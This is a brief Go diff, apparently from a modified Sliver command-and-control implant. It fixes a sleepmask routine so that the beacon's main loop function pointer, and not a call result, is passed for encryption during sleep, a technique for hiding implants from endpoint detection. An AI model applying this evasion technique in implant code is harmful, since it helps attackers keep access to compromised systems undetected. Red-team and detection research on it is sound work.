@@ -283,7 +283,7 @@ func beaconStartup() {
 			//implemented sleepmask here (https://github.com/BishopFox/sliver/discussions/1171#discussioncomment-6690241)
 			//convert reconnect to uint32
 			reconnectUint32 := uint32(reconnect.Seconds())
-			err := encryptFunc(reflect.ValueOf(beaconMainLoop(beacon)).Pointer(), reconnectUint32)
+			err := encryptFunc(reflect.ValueOf(beaconMainLoop).Pointer(), reconnectUint32)
 			if err != nil {
 				// uncomment below line if you want to see the error
 				//fmt.Println(err)
